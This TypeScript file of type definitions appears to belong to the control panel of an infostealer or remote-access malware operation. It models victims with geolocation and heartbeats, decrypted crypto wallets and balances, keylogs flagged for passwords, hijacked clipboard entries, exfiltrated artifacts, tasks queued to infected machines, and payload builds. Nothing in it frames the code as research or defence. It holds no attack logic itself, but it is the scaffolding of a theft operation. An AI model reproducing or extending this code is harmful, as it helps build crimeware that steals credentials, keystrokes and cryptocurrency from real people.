export type Role = 'admin' | 'operator' | 'viewer';

export type Operator = { id: string; email: string; role: Role; totpEnabled: boolean; lastLoginAt: string | null };

export type Victim = {
  id: string;
  hostname: string;
  username: string;
  os: string;
  osVersion: string;
  arch: string;
  country: string | null;
  countryCode: string | null;
  city: string | null;
  lat: number | null;
  lon: number | null;
  tags: string[];
  status: 'online' | 'stale' | 'offline' | 'revoked';
  profile: 'lite' | 'full';
  agentVersion: string;
  ip: string | null;
  firstSeenAt: string;
  lastHeartbeatAt: string;
  lastAgentMessageAt?: string;
  revokedAt?: string | null;
  online: boolean;
  wallets?: number;
  artifacts?: number;
  build?: { id: string; name: string; version: string; buildId: string };
  discord?: { id: string; channelId: string; missingAt: string | null } | null;
  discordChannel?: string | null;
  discordMissingAt?: string | null;
  discordIgnored?: boolean;
  _count?: Record<string, number>;
  balances?: number;
};

export type Wallet = {
  id: string;
  kind: string;
  targetId: string;
  path: string;
  state: 'found' | 'decrypted' | 'locked' | 'unsupported' | 'corrupt';
  decryptState: string;
  reason: string | null;
  address: string | null;
  balance: string | null;
  createdAt: string;
  artifactId: string | null;
};

export type Task = {
  id: string;
  victimId: string;
  name: string;
  params: Record<string, unknown>;
  status: 'queued' | 'running' | 'done' | 'error' | 'cancelled' | 'expired' | 'unknown';
  priority: number;
  timeoutSec: number;
  attempts: number;
  result: Record<string, unknown> | null;
  error: string | null;
  createdAt: string;
  finishedAt: string | null;
  victim?: { id: string; hostname: string; os: string };
  createdBy?: { email: string } | null;
};

export type ClipboardEntry = {
  id: string;
  ts: string;
  window: string;
  process: string;
  content: string;
  kind: string;
  replaced: string | null;
  count?: number;
};

export type Keylog = { id: string; ts: string; process: string; title: string; text: string; password: boolean; count?: number };

export type EventRow = { id: string; kind: string; data: Record<string, unknown>; legacy: string; createdAt: string; victim?: { id: string; hostname: string }; readAt: string | null };

export type Notification = { id: string; kind: string; title: string; body: string; link: string | null; readAt: string | null; createdAt: string };

export type Build = {
  id: string;
  name: string;
  version: string;
  profile: 'lite' | 'full';
  buildId: string;
  token: string;
  universal: boolean;
  status: 'draft' | 'ready' | 'revoked';
  jarPath: string | null;
  createdBy: string | null;
  victims: number;
  createdAt: string;
  revokedAt: string | null;
};

export type Artifact = {
  id: string;
  module: string;
  bytes: number;
  createdAt: string;
  files: Array<{ path: string; size: number; kind: string }>;
};

export type AuditRow = {
  id: string;
  action: string;
  entity: string;
  entityId: string | null;
  ip: string | null;
  data: Record<string, unknown>;
  createdAt: string;
  operator: { email: string } | null;
};

export type Dashboard = {
  counters: { total: number; online: number; wallets: number; balances: number; artifacts: number; queued: number };
  byOs: Array<{ os: string; count: number }>;
  byCountry: Array<{ country: string; count: number }>;
};

export type MapPoint = { id: string; hostname: string; os: string; country: string | null; city: string | null; lat: number; lon: number; online: boolean };

export type Page<T> = { items: T[]; next: string | null };
